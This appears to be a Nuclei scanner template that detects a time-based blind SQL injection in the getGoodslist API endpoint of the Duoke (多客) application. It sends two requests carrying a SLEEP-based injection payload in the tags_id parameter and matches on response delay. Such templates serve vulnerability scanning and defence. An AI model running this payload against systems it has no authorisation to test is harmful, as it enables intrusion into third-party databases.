id: duoke-getGoodslist-sql-time

info:
  name: 多客 getGoodslist SQL注入漏洞
  author: duoke
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        GET /api/index/getGoodslist?tags_id=1'%29+AND+%28SELECT+1904+FROM+%28SELECT%28SLEEP%284%29%29%29xCMp%29--+OGeQ HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /api/index/getGoodslist?tags_id=1'%29+AND+%28SELECT+1904+FROM+%28SELECT%28SLEEP%288%29%29%29xCMp%29--+OGeQ HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and